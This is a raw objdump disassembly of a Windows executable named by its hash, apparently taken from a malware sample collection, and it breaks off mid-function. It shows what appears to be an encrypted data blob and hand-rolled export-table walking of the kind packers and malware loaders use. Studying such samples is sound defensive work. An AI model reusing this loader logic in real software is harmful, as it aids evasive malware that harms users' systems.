
63d4965ed89e6951bb68f5e76a28f7f9512bf3feb64fcedfc3b98bc72dbcd070.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	jmp    DWORD PTR ds:0x41d290
  401006:	cmp    DWORD PTR ds:0x41fa30,0xffffffff
  40100d:	jne    0x40101b
  40100f:	push   DWORD PTR [esp+0x4]
  401013:	call   DWORD PTR ds:0x41d298
  401019:	pop    ecx
  40101a:	ret    
  40101b:	push   0x41fa2c
  401020:	push   0x41fa30
  401025:	push   DWORD PTR [esp+0xc]
  401029:	call   0x401044
  40102e:	add    esp,0xc
  401031:	ret    
  401032:	push   DWORD PTR [esp+0x4]
  401036:	call   0x401006
  40103b:	neg    eax
  40103d:	sbb    eax,eax
  40103f:	pop    ecx
  401040:	neg    eax
  401042:	dec    eax
  401043:	ret    
  401044:	jmp    DWORD PTR ds:0x41d294
  40104a:	push   ebp
  40104b:	mov    ebp,esp
  40104d:	push   0xffffffff
  40104f:	push   0x41f780
  401054:	push   0x41cd50
  401059:	mov    eax,fs:0x0
  40105f:	push   eax
  401060:	mov    DWORD PTR fs:0x0,esp
  401067:	sub    esp,0x68
  40106a:	push   ebx
  40106b:	push   esi
  40106c:	push   edi
  40106d:	mov    DWORD PTR [ebp-0x18],esp
  401070:	xor    ebx,ebx
  401072:	mov    DWORD PTR [ebp-0x4],ebx
  401075:	push   0x2
  401077:	call   DWORD PTR ds:0x41d2c4
  40107d:	pop    ecx
  40107e:	or     DWORD PTR ds:0x41fa2c,0xffffffff
  401085:	or     DWORD PTR ds:0x41fa30,0xffffffff
  40108c:	call   DWORD PTR ds:0x41d2c0
  401092:	mov    ecx,DWORD PTR ds:0x41fa20
  401098:	mov    DWORD PTR [eax],ecx
  40109a:	call   DWORD PTR ds:0x41d2bc
  4010a0:	mov    ecx,DWORD PTR ds:0x41fa1c
  4010a6:	mov    DWORD PTR [eax],ecx
  4010a8:	mov    eax,ds:0x41d2b8
  4010ad:	mov    eax,DWORD PTR [eax]
  4010af:	mov    ds:0x41fa28,eax
  4010b4:	call   0x4011c9
  4010b9:	cmp    DWORD PTR ds:0x41e470,ebx
  4010bf:	jne    0x4010cd
  4010c1:	push   0x4011c6
  4010c6:	call   DWORD PTR ds:0x41d28c
  4010cc:	pop    ecx
  4010cd:	call   0x4011ae
  4010d2:	push   0x41d2f4
  4010d7:	push   0x41d2f0
  4010dc:	call   0x4011a8
  4010e1:	mov    eax,ds:0x41fa18
  4010e6:	mov    DWORD PTR [ebp-0x6c],eax
  4010e9:	lea    eax,[ebp-0x6c]
  4010ec:	push   eax
  4010ed:	push   DWORD PTR ds:0x41fa14
  4010f3:	lea    eax,[ebp-0x64]
  4010f6:	push   eax
  4010f7:	lea    eax,[ebp-0x70]
  4010fa:	push   eax
  4010fb:	lea    eax,[ebp-0x60]
  4010fe:	push   eax
  4010ff:	call   DWORD PTR ds:0x41d2ac
  401105:	push   0x41d2ec
  40110a:	push   0x41d2e0
  40110f:	call   0x4011a8
  401114:	add    esp,0x24
  401117:	mov    eax,ds:0x41d2a8
  40111c:	mov    esi,DWORD PTR [eax]
  40111e:	mov    DWORD PTR [ebp-0x74],esi
  401121:	cmp    BYTE PTR [esi],0x22
  401124:	jne    0x401160
  401126:	inc    esi
  401127:	mov    DWORD PTR [ebp-0x74],esi
  40112a:	mov    al,BYTE PTR [esi]
  40112c:	cmp    al,bl
  40112e:	je     0x401134
  401130:	cmp    al,0x22
  401132:	jne    0x401126
  401134:	cmp    BYTE PTR [esi],0x22
  401137:	jne    0x40113d
  401139:	inc    esi
  40113a:	mov    DWORD PTR [ebp-0x74],esi
  40113d:	mov    al,BYTE PTR [esi]
  40113f:	cmp    al,bl
  401141:	je     0x401147
  401143:	cmp    al,0x20
  401145:	jbe    0x401139
  401147:	mov    DWORD PTR [ebp-0x30],ebx
  40114a:	lea    eax,[ebp-0x5c]
  40114d:	push   eax
  40114e:	call   DWORD PTR ds:0x41d000
  401154:	test   BYTE PTR [ebp-0x30],0x1
  401158:	je     0x40116b
  40115a:	movzx  eax,WORD PTR [ebp-0x2c]
  40115e:	jmp    0x40116e
  401160:	cmp    BYTE PTR [esi],0x20
  401163:	jbe    0x40113d
  401165:	inc    esi
  401166:	mov    DWORD PTR [ebp-0x74],esi
  401169:	jmp    0x401160
  40116b:	push   0xa
  40116d:	pop    eax
  40116e:	push   eax
  40116f:	push   esi
  401170:	push   ebx
  401171:	push   ebx
  401172:	call   DWORD PTR ds:0x41d004
  401178:	push   eax
  401179:	call   0x4011ca
  40117e:	mov    DWORD PTR [ebp-0x68],eax
  401181:	push   eax
  401182:	call   DWORD PTR ds:0x41d2a4
  401188:	mov    eax,DWORD PTR [ebp-0x14]
  40118b:	mov    ecx,DWORD PTR [eax]
  40118d:	mov    ecx,DWORD PTR [ecx]
  40118f:	mov    DWORD PTR [ebp-0x78],ecx
  401192:	push   eax
  401193:	push   ecx
  401194:	call   0x4011c0
  401199:	pop    ecx
  40119a:	pop    ecx
  40119b:	ret    
  40119c:	mov    esp,DWORD PTR [ebp-0x18]
  40119f:	push   DWORD PTR [ebp-0x78]
  4011a2:	call   DWORD PTR ds:0x41d29c
  4011a8:	jmp    DWORD PTR ds:0x41d2b0
  4011ae:	push   0x30000
  4011b3:	push   0x10000
  4011b8:	call   0x41cd56
  4011bd:	pop    ecx
  4011be:	pop    ecx
  4011bf:	ret    
  4011c0:	jmp    DWORD PTR ds:0x41d2a0
  4011c6:	xor    eax,eax
  4011c8:	ret    
  4011c9:	ret    
  4011ca:	push   DWORD PTR [esp+0x10]
  4011ce:	push   DWORD PTR [esp+0x10]
  4011d2:	push   DWORD PTR [esp+0x10]
  4011d6:	push   DWORD PTR [esp+0x10]
  4011da:	call   0x41cd9c
  4011df:	ret    0x10
  4011e2:	int3   
  4011e3:	int3   
  4011e4:	int3   
  4011e5:	int3   
  4011e6:	int3   
  4011e7:	int3   
  4011e8:	int3   
  4011e9:	int3   
  4011ea:	int3   
  4011eb:	int3   
  4011ec:	int3   
  4011ed:	int3   
  4011ee:	int3   
  4011ef:	int3   
  4011f0:	mov    BYTE PTR [esi],0xa2
  4011f3:	sub    ch,BYTE PTR [edi]
  4011f5:	cmp    BYTE PTR [ecx],al
  4011f7:	push   0x7fb6a89f
  4011fc:	sti    
  4011fd:	repnz neg DWORD PTR [ecx-0x24abbdaf]
  401204:	mov    BYTE PTR [esi],0xa2
  401207:	sub    ch,BYTE PTR [edi]
  401209:	xchg   ebx,eax
  40120a:	lea    ecx,[esi-0x57]
  40120d:	jmp    0x4011db
  40120f:	mov    BYTE PTR ds:0x77eb236b,ch
  401215:	jo     0x4011c8
  401217:	repz leave 
  401219:	ficom  DWORD PTR [ecx]
  40121b:	je     0x40126d
  40121d:	test   BYTE PTR [esi],dl
  40121f:	repnz mov eax,ds:0xb8fe306d
  401225:	push   ss
  401226:	in     eax,dx
  401227:	dec    esi
  401228:	hlt    
  401229:	mov    al,0xfe
  40122b:	ss jo  0x40128b
  40122e:	add    edx,DWORD PTR [ebp+0x6235ca3a]
  401234:	inc    eax
  401235:	outs   dx,DWORD PTR ds:[esi]
  401236:	push   eax
  401237:	add    DWORD PTR [eax-0x61],edi
  40123a:	test   al,0xe7
  40123c:	das    
  40123d:	jo     0x4011f6
  40123f:	pcmpgtd mm0,QWORD PTR [ecx-0x6506b39]
  401246:	(bad)  
  401247:	out    0xd6,eax
  401249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40124a:	inc    ebp
  40124b:	std    
  40124c:	jecxz  0x40121a
  40124e:	mov    esp,0xe2a0f4e5
  401253:	jl     0x4011ff
  401255:	pop    esi
  401256:	cmc    
  401257:	pop    esi
  401258:	pop    eax
  401259:	aas    
  40125a:	push   es
  40125b:	(bad)  
  40125c:	and    BYTE PTR [ebx+edi*2+0x42],ch
  401260:	sub    ebx,ebp
  401262:	jmp    0x12ac:0x1e10db45
  401269:	sub    al,0xbe
  40126b:	fild   QWORD PTR [eax+0x36e18dde]
  401271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401272:	jae    0x401281
  401274:	jecxz  0x401242
  401276:	mov    al,ds:0xb970ad49
  40127b:	xlat   BYTE PTR ds:[ebx]
  40127c:	adc    dl,BYTE PTR [esi+edi*4]
  40127f:	push   edi
  401280:	sahf   
  401281:	xor    dl,BYTE PTR [edi+0x5d]
  401284:	cli    
  401285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401286:	fstp   QWORD PTR [ebx+ebp*4-0x34]
  40128a:	int3   
  40128b:	int3   
  40128c:	int3   
  40128d:	int3   
  40128e:	int3   
  40128f:	int3   
  401290:	movzx  ecx,WORD PTR [eax+0x3c]
  401294:	mov    DWORD PTR [ebp-0x4],eax
  401297:	add    eax,ecx
  401299:	mov    ecx,0x18
  40129e:	add    eax,ecx
  4012a0:	inc    ecx
  4012a1:	add    ecx,0xf0
  4012a7:	ret    
  4012a8:	int3   
  4012a9:	int3   
  4012aa:	int3   
  4012ab:	int3   
  4012ac:	int3   
  4012ad:	int3   
  4012ae:	int3   
  4012af:	int3   
  4012b0:	push   ebx
  4012b1:	mov    ebx,esi
  4012b3:	mov    eax,DWORD PTR [ebx]
  4012b5:	jmp    0x401570
  4012ba:	pop    ebx
  4012bb:	call   0x4014a0
  4012c0:	ret    
  4012c1:	int3   
  4012c2:	int3   
  4012c3:	int3   
  4012c4:	int3   
  4012c5:	int3   
  4012c6:	int3   
  4012c7:	int3   
  4012c8:	int3   
  4012c9:	int3   
  4012ca:	int3   
  4012cb:	int3   
  4012cc:	int3   
  4012cd:	int3   
  4012ce:	int3   
  4012cf:	int3   
  4012d0:	mov    edx,ecx
  4012d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4012d5:	xor    eax,eax
  4012d7:	inc    edx
  4012d8:	mov    ecx,DWORD PTR [edx]
  4012da:	inc    eax
  4012db:	inc    cl
  4012dd:	dec    cl
  4012df:	jne    0x4012d7
  4012e1:	dec    eax
  4012e2:	ret    
  4012e3:	int3   
  4012e4:	int3   
  4012e5:	int3   
  4012e6:	int3   
  4012e7:	int3   
  4012e8:	int3   
  4012e9:	int3   
  4012ea:	int3   
  4012eb:	int3   
  4012ec:	int3   
  4012ed:	int3   
  4012ee:	int3   
  4012ef:	int3   
  4012f0:	mov    edi,0x41dc49
  4012f5:	mov    ecx,DWORD PTR ds:0x41dd0e
  4012fb:	test   ecx,ecx
  4012fd:	je     0x40132a
  4012ff:	dec    eax
  401300:	dec    eax
  401301:	test   eax,eax
  401303:	je     0x40132a
  401305:	mov    esi,0x401204
  40130a:	call   0x401580
  40130f:	mov    esi,edi
  401311:	mov    eax,0x64
  401316:	add    DWORD PTR ds:0x41dd17,eax
  40131c:	mov    ecx,DWORD PTR [esi]
  40131e:	push   ecx
  40131f:	push   DWORD PTR ds:0x41dd23
  401325:	call   0x4013c0
  40132a:	ret    
  40132b:	int3   
  40132c:	int3   
  40132d:	int3   
  40132e:	int3   
  40132f:	int3   
  401330:	cmp    eax,0x8
  401333:	jne    0x401336
  401335:	ret    
  401336:	mov    ebp,esp
  401338:	mov    edx,0x41d004
  40133d:	mov    ecx,DWORD PTR [edx]
  40133f:	mov    DWORD PTR ds:0x41dd23,ecx
  401345:	mov    edx,0x4014e0
  40134a:	add    edx,eax
  40134c:	mov    DWORD PTR ds:0x41dd17,ebp
  401352:	call   edx
  401354:	push   0x41dc49
  401359:	call   0x401209
  40135e:	ret    
  40135f:	int3   
  401360:	push   ecx
  401361:	mov    eax,DWORD PTR [edi]
  401363:	mov    ecx,eax
  401365:	dec    eax
  401366:	call   0x4012b0
  40136b:	dec    edx
  40136c:	test   edx,edx
  40136e:	jne    0x401374
  401370:	sub    esi,ebx
  401372:	mov    edx,ebx
  401374:	inc    edi
  401375:	pop    ecx
  401376:	mov    eax,edx
  401378:	ret    
  401379:	int3   
  40137a:	int3   
  40137b:	int3   
  40137c:	int3   
  40137d:	int3   
  40137e:	int3   
  40137f:	int3   
  401380:	dec    edx
  401381:	and    eax,edx
  401383:	nop
  401384:	not    edx
  401386:	inc    edx
  401387:	add    eax,edx
  401389:	ret    
  40138a:	int3   
  40138b:	int3   
  40138c:	int3   
  40138d:	int3   
  40138e:	int3   
  40138f:	int3   
  401390:	add    eax,0x60
  401393:	mov    esi,DWORD PTR [eax]
  401395:	mov    eax,DWORD PTR [ebp-0x4]
  401398:	add    eax,esi
  40139a:	add    eax,0x20
  40139d:	mov    esi,eax
  40139f:	mov    edi,DWORD PTR [esi]
  4013a1:	sub    esi,0xc
  4013a4:	mov    eax,DWORD PTR [esi]
  4013a6:	add    edi,DWORD PTR [ebp-0x4]
  4013a9:	mov    DWORD PTR [ebp-0xc],eax
  4013ac:	sub    esi,0x14
  4013af:	xor    edx,edx
  4013b1:	mov    ebx,DWORD PTR [ebp+0xc]
  4013b4:	ret    
  4013b5:	int3   
  4013b6:	int3   
  4013b7:	int3   
  4013b8:	int3   
  4013b9:	int3   
  4013ba:	int3   
  4013bb:	int3   
  4013bc:	int3   
  4013bd:	int3   
  4013be:	int3   
  4013bf:	int3   
  4013c0:	push   ebp
  4013c1:	mov    ebp,esp
  4013c3:	sub    esp,0x10
  4013c6:	mov    edx,DWORD PTR ds:0x41e380
  4013cc:	mov    eax,DWORD PTR [ebp+0x8]
  4013cf:	call   0x401380
  4013d4:	sub    eax,edx
  4013d6:	mov    ecx,DWORD PTR [eax]
  4013d8:	add    cl,ch
  4013da:	inc    cl
  4013dc:	cmp    cx,0x5aa8
  4013e1:	jne    0x4013d4
  4013e3:	push   ebx
  4013e4:	call   0x401290
  4013e9:	inc    ecx
  4013ea:	push   esi
  4013eb:	push   edi
  4013ec:	inc    ecx
  4013ed:	cmp    WORD PTR [eax],cx
  4013f0:	jne    0x401449
  4013f2:	call   0x401390
  4013f7:	xor    edx,edx
  4013f9:	mov    ebx,DWORD PTR [ebp+0xc]
  4013fc:	mov    ecx,edx
  4013fe:	dec    ebx
  4013ff:	call   0x4014d0
  401404:	dec    ecx
  401405:	mov    DWORD PTR [ebp-0x10],ecx
  401408:	xor    eax,eax
  40140a:	mov    DWORD PTR [ebp-0x8],eax
  40140d:	mov    ecx,DWORD PTR [edi]
  40140f:	dec    ecx
  401410:	add    ecx,DWORD PTR [ebp-0x4]
  401413:	call   0x4012d0
  401418:	cmp    eax,ebx
  40141a:	jne    0x401425
  40141c:	call   0x4014b0
  401421:	test   eax,eax
  401423:	je     0x401436
  401425:	inc    edi
  401426:	inc    edi
  401427:	inc    DWORD PTR [ebp-0x8]
  40142a:	inc    edi
  40142b:	inc    edi
  40142c:	mov    eax,DWORD PTR [ebp-0x8]
  40142f:	mov    ecx,DWORD PTR [ebp-0xc]
  401432:	cmp    eax,ecx
  401434:	jb     0x40140d
  401436:	mov    eax,DWORD PTR [ebp-0x8]
  401439:	mov    ecx,DWORD PTR [ebp-0xc]
  40143c:	cmp    eax,ecx
  40143e:	jae    0x401449
  401440:	call   0x401460
  401445:	add    eax,ecx
  401447:	jmp    0x40144b
  401449:	xor    eax,eax
  40144b:	pop    edi
  40144c:	pop    esi
  40144d:	pop    ebx
  40144e:	leave  
  40144f:	ret    0x8
  401452:	int3   
  401453:	int3   
  401454:	int3   
  401455:	int3   
  401456:	int3   
  401457:	int3   
  401458:	int3   
  401459:	int3   
  40145a:	int3   
  40145b:	int3   
  40145c:	int3   
  40145d:	int3   
  40145e:	int3   
  40145f:	int3   
  401460:	mov    ecx,0x24
  401465:	add    esi,ecx
  401467:	mov    ecx,DWORD PTR [esi]
  401469:	shl    eax,1
  40146b:	add    ecx,eax
  40146d:	mov    eax,DWORD PTR [ebp-0x4]
  401470:	add    ecx,eax
  401472:	movzx  eax,WORD PTR [ecx]
  401475:	sub    esi,0x24
  401478:	mov    ecx,DWORD PTR [esi+0x1c]
  40147b:	lea    eax,[ecx+eax*4]
  40147e:	mov    ecx,DWORD PTR [ebp-0x4]
  401481:	mov    eax,DWORD PTR [ecx+eax*1]
  401484:	ret    
  401485:	int3   
  401486:	int3   
  401487:	int3   
  401488:	int3   
  401489:	int3   
  40148a:	int3   
  40148b:	int3   
  40148c:	int3   
  40148d:	int3   
  40148e:	int3   
  40148f:	int3   
  401490:	mov    al,BYTE PTR [edi]
  401492:	mov    cl,BYTE PTR [esi]
  401494:	ret    
  401495:	int3   
  401496:	int3   
  401497:	int3   
  401498:	int3   
  401499:	int3   
  40149a:	int3   
  40149b:	int3   
  40149c:	int3   
  40149d:	int3   
  40149e:	int3   
  40149f:	int3   
  4014a0:	push   esi
  4014a1:	push   ecx
  4014a2:	mov    esi,edi
  4014a4:	mov    BYTE PTR [esi],al
  4014a6:	pop    ecx
  4014a7:	pop    esi
  4014a8:	inc    esi
  4014a9:	ret    
  4014aa:	int3   
  4014ab:	int3   
  4014ac:	int3   
  4014ad:	int3   
  4014ae:	int3   
  4014af:	int3   
  4014b0:	mov    eax,DWORD PTR [edi]
  4014b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4014b5:	add    ecx,eax
  4014b7:	push   DWORD PTR [ebp+0xc]
  4014ba:	push   ecx
  4014bb:	call   0x401540
  4014c0:	ret    
  4014c1:	int3   
  4014c2:	int3   
  4014c3:	int3   
  4014c4:	int3   
  4014c5:	int3   
  4014c6:	int3   
  4014c7:	int3   
  4014c8:	int3   
  4014c9:	int3   
  4014ca:	int3   
  4014cb:	int3   
  4014cc:	int3   
  4014cd:	int3   
  4014ce:	int3   
  4014cf:	int3   
  4014d0:	mov    eax,DWORD PTR [ebx+0x1]
  4014d3:	inc    ebx
  4014d4:	inc    ecx
  4014d5:	cmp    al,dl
  4014d7:	jne    0x4014d0
  4014d9:	ret    
  4014da:	int3   
  4014db:	int3   
  4014dc:	int3   
  4014dd:	int3   
  4014de:	int3   
  4014df:	int3   
  4014e0:	inc    eax
  4014e1:	inc    ecx
  4014e2:	xor    eax,ecx
  4014e4:	push   ebp
  4014e5:	mov    ebp,esp
  4014e7:	mov    ecx,eax
  4014e9:	push   ecx
  4014ea:	inc    ecx
  4014eb:	cmp    ecx,0xa
  4014ee:	je     0x401290
  4014f4:	call   0x4012f0
  4014f9:	mov    ecx,0x40
  4014fe:	lea    esi,ds:0x4011f0
  401504:	push   0x41e418
  401509:	push   ecx
  40150a:	mov    edx,0x401209
  40150f:	push   0xffa
  401514:	cmp    edx,0x0
  401517:	je     0x4014e7
  401519:	push   edx
  40151a:	jmp    0x401535
  40151c:	mov    ecx,0x7f
  401521:	mov    edi,0x401209
  401526:	inc    ecx
  401527:	mov    eax,ds:0x41dc65
  40152c:	call   0x401580
  401531:	pop    eax
  401532:	inc    eax
  401533:	inc    eax
  401534:	ret    
  401535:	call   eax
  401537:	jmp    0x40151c
  401539:	int3   
  40153a:	int3   
  40153b:	int3   
  40153c:	int3   
  40153d:	int3   
  40153e:	int3   
  40153f:	int3   
  401540:	push   ebp
  401541:	mov    ebp,esp
  401543:	push   esi
  401544:	xor    eax,eax
  401546:	push   edi
  401547:	mov    edi,DWORD PTR [ebp+0xc]
  40154a:	mov    esi,DWORD PTR [ebp+0x8]
  40154d:	mov    ecx,eax
  40154f:	call   0x401490
  401554:	cmp    eax,ecx
  401556:	jne    0x401560
  401558:	or     eax,eax
  40155a:	je     0x401563
  40155c:	inc    esi
  40155d:	inc    edi
  40155e:	jmp    0x40154f
  401560:	xor    eax,eax
  401562:	inc    eax
  401563:	pop    edi
  401564:	pop    esi
  401565:	mov    esp,ebp
  401567:	pop    ebp
  401568:	ret    0x8
  40156b:	int3   
  40156c:	int3   
  40156d:	int3   
  40156e:	int3   
  40156f:	int3   
  401570:	xor    eax,ecx
  401572:	jmp    0x4012ba
  401577:	int3   
  401578:	int3   
  401579:	int3   
  40157a:	int3   
  40157b:	int3   
  40157c:	int3   
  40157d:	int3   
  40157e:	int3   
  40157f:	int3   
  401580:	push   ebx
  401581:	push   edi
  401582:	mov    ebx,eax
  401584:	mov    edx,eax
  401586:	push   ecx
  401587:	call   0x401360
  40158c:	pop    ecx
  40158d:	dec    ecx
  40158e:	jne    0x401586
  401590:	pop    edi
  401591:	pop    ebx
  401592:	xor    eax,eax
  401594:	ret    
  401595:	int3   
  401596:	int3   
  401597:	int3   
  401598:	int3   
  401599:	int3   
  40159a:	int3   
  40159b:	int3   
  40159c:	int3   
  40159d:	int3   
  40159e:	int3   
  40159f:	int3   
  4015a0:	push   ebp
  4015a1:	mov    ebp,esp
  4015a3:	mov    eax,ds:0x41d010
  4015a8:	pop    ebp
  4015a9:	ret    
  4015aa:	int3   
  4015ab:	int3   
  4015ac:	int3   
  4015ad:	int3   
  4015ae:	int3   
  4015af:	int3   
  4015b0:	push   ebp
  4015b1:	mov    ebp,esp
  4015b3:	push   ecx
  4015b4:	mov    DWORD PTR [ebp-0x4],ecx
  4015b7:	mov    eax,0x41f178
  4015bc:	mov    esp,ebp
  4015be:	pop    ebp
  4015bf:	ret    
  4015c0:	push   ebp
  4015c1:	mov    ebp,esp
  4015c3:	push   0xffffffff
  4015c5:	push   0x41cdc8
  4015ca:	mov    eax,fs:0x0
  4015d0:	push   eax
  4015d1:	mov    DWORD PTR fs:0x0,esp
  4015d8:	sub    esp,0xc
  4015db:	mov    DWORD PTR [ebp-0x18],ecx
  4015de:	mov    ecx,DWORD PTR [ebp-0x18]
  4015e1:	call   0x41cc02
  4015e6:	mov    DWORD PTR [ebp-0x4],0x0
  4015ed:	mov    eax,DWORD PTR [ebp-0x18]
  4015f0:	add    eax,0xc0
  4015f5:	mov    DWORD PTR [ebp-0x10],eax
  4015f8:	mov    ecx,DWORD PTR [ebp-0x10]
  4015fb:	call   0x41cbfc
  401600:	mov    ecx,DWORD PTR [ebp-0x10]
  401603:	mov    DWORD PTR [ecx],0x41f3dc
  401609:	mov    BYTE PTR [ebp-0x4],0x1
  40160d:	mov    edx,DWORD PTR [ebp-0x18]
  401610:	add    edx,0x100
  401616:	mov    DWORD PTR [ebp-0x14],edx
  401619:	push   0x50800000
  40161e:	push   0x41e42c
  401623:	mov    ecx,DWORD PTR [ebp-0x14]
  401626:	call   0x41cbf6
  40162b:	mov    eax,DWORD PTR [ebp-0x14]
  40162e:	mov    DWORD PTR [eax],0x41f2c8
  401634:	mov    ecx,DWORD PTR [ebp-0x18]
  401637:	mov    DWORD PTR [ecx],0x41f1c8
  40163d:	mov    DWORD PTR [ebp-0x4],0xffffffff
  401644:	mov    eax,DWORD PTR [ebp-0x18]
  401647:	mov    ecx,DWORD PTR [ebp-0xc]
  40164a:	mov    DWORD PTR fs:0x0,ecx
  401651:	mov    esp,ebp
  401653:	pop    ebp
  401654:	ret    
  401655:	int3   
  401656:	int3   
  401657:	int3   
  401658:	int3   
  401659:	int3   
  40165a:	int3   
  40165b:	int3   
  40165c:	int3   
  40165d:	int3   
  40165e:	int3   
  40165f:	int3   
  401660:	push   ebp
  401661:	mov    ebp,esp
  401663:	push   ecx
  401664:	mov    DWORD PTR [ebp-0x4],ecx
  401667:	mov    ecx,DWORD PTR [ebp-0x4]
  40166a:	call   0x401690
  40166f:	mov    eax,DWORD PTR [ebp+0x8]
  401672:	and    eax,0x1
  401675:	test   eax,eax
  401677:	je     0x401685
  401679:	mov    ecx,DWORD PTR [ebp-0x4]
  40167c:	push   ecx
  40167d:	call   0x41cc08
  401682:	add    esp,0x4
  401685:	mov    eax,DWORD PTR [ebp-0x4]
  401688:	mov    esp,ebp
  40168a:	pop    ebp
  40168b:	ret    0x4
  40168e:	int3   
  40168f:	int3   
  401690:	push   ebp
  401691:	mov    ebp,esp
  401693:	push   0xffffffff
  401695:	push   0x41cde9
  40169a:	mov    eax,fs:0x0
  4016a0:	push   eax
  4016a1:	mov    DWORD PTR fs:0x0,esp
  4016a8:	push   ecx
  4016a9:	mov    DWORD PTR [ebp-0x10],ecx
  4016ac:	mov    DWORD PTR [ebp-0x4],0x0
  4016b3:	mov    ecx,DWORD PTR [ebp-0x10]
  4016b6:	add    ecx,0x44
  4016b9:	call   0x41cc14
  4016be:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4016c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4016c8:	call   0x41cc0e
  4016cd:	mov    ecx,DWORD PTR [ebp-0xc]
  4016d0:	mov    DWORD PTR fs:0x0,ecx
  4016d7:	mov    esp,ebp
  4016d9:	pop    ebp
  4016da:	ret    
  4016db:	int3   
  4016dc:	int3   
  4016dd:	int3   
  4016de:	int3   
  4016df:	int3   
  4016e0:	push   ebp
  4016e1:	mov    ebp,esp
  4016e3:	push   ecx
  4016e4:	mov    DWORD PTR [ebp-0x4],ecx
  4016e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4016ea:	call   0x401710
  4016ef:	mov    eax,DWORD PTR [ebp+0x8]
  4016f2:	and    eax,0x1
  4016f5:	test   eax,eax
  4016f7:	je     0x401705
  4016f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4016fc:	push   ecx
  4016fd:	call   0x41cc08
  401702:	add    esp,0x4
  401705:	mov    eax,DWORD PTR [ebp-0x4]
  401708:	mov    esp,ebp
  40170a:	pop    ebp
  40170b:	ret    0x4
  40170e:	int3   
  40170f:	int3   
  401710:	push   ebp
  401711:	mov    ebp,esp
  401713:	push   0xffffffff
  401715:	push   0x41ce21
  40171a:	mov    eax,fs:0x0
  401720:	push   eax
  401721:	mov    DWORD PTR fs:0x0,esp
  401728:	sub    esp,0x8
  40172b:	mov    DWORD PTR [ebp-0x14],ecx
  40172e:	mov    eax,DWORD PTR [ebp-0x14]
  401731:	mov    DWORD PTR [eax],0x41f1c8
  401737:	mov    DWORD PTR [ebp-0x4],0x1
  40173e:	mov    ecx,DWORD PTR [ebp-0x14]
  401741:	add    ecx,0x100
  401747:	mov    DWORD PTR [ebp-0x10],ecx
  40174a:	mov    BYTE PTR [ebp-0x4],0x2
  40174e:	mov    ecx,DWORD PTR [ebp-0x10]
  401751:	add    ecx,0x44
  401754:	call   0x41cc14
  401759:	mov    BYTE PTR [ebp-0x4],0x1
  40175d:	mov    ecx,DWORD PTR [ebp-0x10]
  401760:	call   0x41cc0e
  401765:	mov    BYTE PTR [ebp-0x4],0x0
  401769:	mov    ecx,DWORD PTR [ebp-0x14]
  40176c:	add    ecx,0xc0
  401772:	call   0x41cbea
  401777:	mov    DWORD PTR [ebp-0x4],0xffffffff
  40177e:	mov    ecx,DWORD PTR [ebp-0x14]
  401781:	call   0x41cbf0
  401786:	mov    ecx,DWORD PTR [ebp-0xc]
  401789:	mov    DWORD PTR fs:0x0,ecx
  401790:	mov    esp,ebp
  401792:	pop    ebp
  401793:	ret    
  401794:	int3   
  401795:	int3   
  401796:	int3   
  401797:	int3   
  401798:	int3   
  401799:	int3   
  40179a:	int3   
  40179b:	int3   
  40179c:	int3   
  40179d:	int3   
  40179e:	int3   
  40179f:	int3   
  4017a0:	push   ebp
  4017a1:	mov    ebp,esp
  4017a3:	push   ecx
  4017a4:	mov    DWORD PTR [ebp-0x4],ecx
  4017a7:	mov    esp,ebp
  4017a9:	pop    ebp
  4017aa:	ret    
  4017ab:	int3   
  4017ac:	int3   
  4017ad:	int3   
  4017ae:	int3   
  4017af:	int3   
  4017b0:	push   ebp
  4017b1:	mov    ebp,esp
  4017b3:	sub    esp,0x64
  4017b6:	mov    DWORD PTR [ebp-0x64],ecx
  4017b9:	push   0x0
  4017bb:	mov    eax,DWORD PTR [ebp-0x64]
  4017be:	push   eax
  4017bf:	lea    ecx,[ebp-0x34]
  4017c2:	push   ecx
  4017c3:	push   0x1
  4017c5:	mov    ecx,DWORD PTR ds:0x41f940
  4017cb:	call   0x41cc20
  4017d0:	push   0xffffffff
  4017d2:	push   0xffffffff
  4017d4:	push   0x0
  4017d6:	push   0x41e444
  4017db:	push   0x0
  4017dd:	mov    ecx,DWORD PTR ds:0x41f940
  4017e3:	call   0x41cc1a
  4017e8:	mov    DWORD PTR [ebp-0x24],eax
  4017eb:	mov    DWORD PTR [ebp-0x20],0x5
  4017f2:	mov    DWORD PTR [ebp-0x14],0x41e43c
  4017f9:	mov    DWORD PTR [ebp-0x1c],0x0
  401800:	mov    DWORD PTR [ebp-0x3c],0x1
  401807:	mov    edx,DWORD PTR ds:0x41f940
  40180d:	mov    DWORD PTR [ebp-0x38],edx
  401810:	lea    eax,[ebp-0x20]
  401813:	push   eax
  401814:	mov    ecx,DWORD PTR [ebp-0x3c]
  401817:	push   ecx
  401818:	push   0x101b
  40181d:	mov    edx,DWORD PTR [ebp-0x38]
  401820:	mov    eax,DWORD PTR [edx+0x20]
  401823:	push   eax
  401824:	call   DWORD PTR ds:0x41d2d4
  40182a:	mov    DWORD PTR [ebp-0x24],eax
  40182d:	mov    DWORD PTR [ebp-0x48],0x7
  401834:	mov    DWORD PTR [ebp-0x44],0x0
  40183b:	mov    ecx,DWORD PTR ds:0x41f940
  401841:	mov    DWORD PTR [ebp-0x40],ecx
  401844:	mov    edx,DWORD PTR [ebp-0x48]
  401847:	and    edx,0xffff
  40184d:	push   edx
  40184e:	mov    eax,DWORD PTR [ebp-0x44]
  401851:	push   eax
  401852:	push   0x101e
  401857:	mov    ecx,DWORD PTR [ebp-0x40]
  40185a:	mov    edx,DWORD PTR [ecx+0x20]
  40185d:	push   edx
  40185e:	call   DWORD PTR ds:0x41d2d4
  401864:	mov    DWORD PTR [ebp-0x24],eax
  401867:	mov    DWORD PTR [ebp-0x54],0xfffffffe
  40186e:	mov    DWORD PTR [ebp-0x50],0x1
  401875:	mov    eax,ds:0x41f940
  40187a:	mov    DWORD PTR [ebp-0x4c],eax
  40187d:	mov    ecx,DWORD PTR [ebp-0x54]
  401880:	and    ecx,0xffff
  401886:	push   ecx
  401887:	mov    edx,DWORD PTR [ebp-0x50]
